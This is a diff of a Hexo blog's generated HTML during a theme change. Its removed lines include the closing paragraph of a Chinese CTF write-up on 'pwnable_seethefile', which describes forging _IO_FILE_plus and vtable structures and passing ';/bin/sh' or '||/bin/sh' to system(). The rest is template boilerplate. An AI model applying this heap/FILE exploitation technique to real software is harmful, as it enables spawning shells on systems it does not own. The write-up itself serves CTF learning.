-<p>因此此时的fp指针其实就是system的参数，虽然fp并未直接指向”&#x2F;bin&#x2F;sh”,但是system解析指令的时，无法解析0xffffdfff，便会继续向后检查，这里除了写”;bin&#x2F;sh“,话可以有”||&#x2F;bin&#x2F;sh“,覆盖后面的指针也问题不大</p>
-</li>
-</ol>
-<p>​        </p>
-<p>总结：这个文章内容比较多，但是重点就在与io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造vtable,而时可以直接修改vtable的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、</p>
-
-      
+    <div id="header">
+        <div>
+            <a class="image-logo" href="/"></a>
+			
+            <div class="iconfont icon-menu switchmenu"></div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/19/pwnable-seethefile/" data-id="cl0yt0yk80000nsu6a2yf7f0h" data-title="pwnable_seethefile" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">_writeup</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/19/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2021-03-18T16:00:00.000Z" itemprop="datePublished">2021-03-19</time>
-</a>
     
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/19/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
+    <div id="post0">
+        <p>三月 19, 2022</p>
+        <h2><a href="/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile" class="posttitle">pwnable_seethefile</a></h2>
+        <p class="summary">12p  *(struct _IO_FILE_plus *)0x804c410gdb调FILE_PLUS结构体，可...</p>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/19/hello-world/" data-id="cl0xqe9zg0000o4u67aot7ypi" data-title="Hello World" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hello-World/" rel="tag">Hello World</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
     
+</div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hello-World/" rel="tag">Hello World</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">_writeup</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/Hello-World/" style="font-size: 10px;">Hello World</a> <a href="/tags/writeup/" style="font-size: 10px;">_writeup</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
+    <div id="primary">
         
-          <li>
-            <a href="/2022/03/19/pwnable-seethefile/">pwnable_seethefile</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/19/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
+<div class="post">
+    <a href="/2021/03/19/hello-world/" title="Hello World">
+        <img src="/img/cover.jpg" class="cover" width="680" height="440">
+    </a>
+    <div class="else">
+        <p>三月 19, 2021</p>
+        <h3><a href="/2021/03/19/hello-world/" title="Hello World" class="posttitle">Hello World</a></h3>
+        <p>Welcome to Hexo! This is your very first post. Check documentation for more i...</p>
     </div>
-  </div>
+</div>
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2022 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
 
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
     
-
-
-<script src="/js/jquery-3.4.1.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+</div>
+<div id="preview"></div>
 
 
 
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
 </body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
 </html>
